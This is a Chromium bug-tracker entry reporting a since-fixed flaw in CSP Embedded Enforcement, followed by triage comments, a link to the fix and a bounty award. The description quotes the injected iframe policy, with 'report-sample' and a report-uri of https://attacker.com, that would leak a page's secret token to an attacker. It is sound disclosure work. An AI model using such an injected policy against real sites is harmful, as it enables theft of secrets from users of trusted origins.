# CSP script-sample and report-uri together with Embedded Enforcement is harmful

| Field | Value |
|-------|-------|
| **Issue ID** | [40088065](https://issues.chromium.org/issues/40088065) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | s....@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2017-06-13 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36

Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/embenf.html
2. Violation report including secret token is leaked to attacker's URL

What is the expected behavior?
Maybe disallow report-uri or script-sample in iframe's csp attribute?

What went wrong?
Scenario:
https://vuln.shhnjk.com trusts https://test.shhnjk.com. So https://vuln.shhnjk.com/allowcsp.php has "Allow-CSP-From: https://test.shhnjk.com" header set.

Now attacker found HTML injection in https://test.shhnjk.com. So he/she injected iframe with csp attribute "script-src 'sha256-test' 'report-sample'; report-uri https://attacker.com".

Because attacker injected 'report-sample' and 'report-uri', attacker gets secret token in the script of https://vuln.shhnjk.com/allowcsp.php.

Did this work before? N/A 

Chrome version: 61.0.3128.0  Channel: canary
OS Version: OS X 10.12.5
Flash Version: 

Let me know if this is acceptable risk in Embedded Enforcement. Then I'll blog about it.

## Timeline

### el...@chromium.org (2017-06-13)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature]

### el...@chromium.org (2017-06-13)

[Empty comment from Monorail migration]

### mk...@chromium.org (2017-06-13)

We ought to be preventing both `report-uri` and `report-to` from being cascaded down via this mechanism. Andy, can you make sure that happens? I thought we added a check to https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/frame/csp/ContentSecurityPolicy.cpp?rcl=0a02ecd5e26cd16d87a195f627885abddeeed89b&l=1712, but I don't see it in the code. :)

[Monorail components: -Blink>SecurityFeature Blink>SecurityFeature>ContentSecurityPolicy]

### mk...@chromium.org (2017-06-13)

[Empty comment from Monorail migration]

### s....@gmail.com (2017-06-13)

Okay, I wrote Canary but this should be available in Dev-channel too.
https://chromereleases.googleblog.com/2017/06/dev-channel-update-for-desktop_9.html

Hope this is eligible for bounty program.

### sh...@chromium.org (2017-06-14)

This issue is a security regression. If you are not able to fix this quickly, please revert the change that introduced it.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-06-14)

[Empty comment from Monorail migration]

### s....@gmail.com (2017-06-16)

Dear Mike,

May I know where can I see list of directives and values that are restricted in iframe csp attribute?

### aw...@chromium.org (2017-06-21)

[Empty comment from Monorail migration]

### an...@chromium.org (2017-06-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-06-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-06-27)

[Empty comment from Monorail migration]

### lg...@chromium.org (2017-06-28)

The fix appears to be: https://chromium.googlesource.com/chromium/src/+/ff7b272d016a47e144f6cfa72c564e56835ac3f1

### aw...@google.com (2017-07-10)

Hi s.h.h.n.j.k@ - the VRP panel decided to award $500 for this bug. Thanks!

### aw...@chromium.org (2017-07-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-07-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-10-02)

This issue was migrated from crbug.com/chromium/732779?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088065)*
